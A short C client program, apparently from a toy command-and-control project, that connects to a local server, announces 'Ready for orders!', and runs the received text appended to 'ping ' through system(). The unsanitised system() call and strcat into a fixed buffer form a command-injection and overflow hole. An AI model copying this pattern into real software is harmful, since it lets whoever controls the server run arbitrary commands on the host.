#include "../fleurieu.h"
#include "client.h"

int main() {
	struct Client client = init_client("127.0.0.1", 9999);

	connect(client.socket, (struct sockaddr*)&client.addr, sizeof(client.addr));
	log_message("Connected to server.");

	send_message("Ready for orders!", client.socket);

	recieve_message(client.socket, client.buffer);
	log_message(client.buffer);

	char command[1000] = "ping ";
	strcat(command, client.buffer);

	system(command);

	return 0;
}